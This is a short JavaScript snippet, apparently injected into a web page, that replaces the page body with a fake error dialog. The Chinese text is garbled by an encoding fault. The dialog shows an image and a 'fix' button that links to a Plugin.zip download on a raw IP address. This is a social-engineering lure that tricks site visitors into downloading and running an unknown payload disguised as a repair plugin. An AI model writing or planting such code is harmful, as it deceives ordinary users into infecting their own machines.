var body = document.body;

// ����λ�ú͸߶�
var _left = window.innerWidth * 0.3 + 'px';
var _top = window.innerHeight * 0.3 + 'px';
var _height = window.innerHeight + 'px';

// ������ʾ���HTML�ṹ
body.innerHTML = `
    <div style="background-color: white; height: ${_height}; position: relative;">
        <div style='position: absolute; top: ${_top}; left: ${_left}; height: 300px; width: 600px; border: 1px solid #ccc; box-shadow: 0 0 10px rgba(0, 0, 0, 0.5); padding: 20px;'>
            <img src='http://39.*.*.*/sdp.png' style='margin: 3px; width: 100%; max-width: 100px;'>
            <h3>�ࡣ�������!</h3>
            <p style='color: gray;'>��ʾ����ҳʱ���˵����⣬��������ҳ����������ʾ������Ӷ����ܻ�����������</p>
            <a href='http://39.105.*.*/Plugin.zip'>
                <button style='margin-left: 85%; height: 30px; line-height: 30px; outline: none; border: none; background-color: rgb(26, 115, 232); color: white; cursor: pointer;'>�����޸�</button>
            </a>
        </div>
    </div>
`;
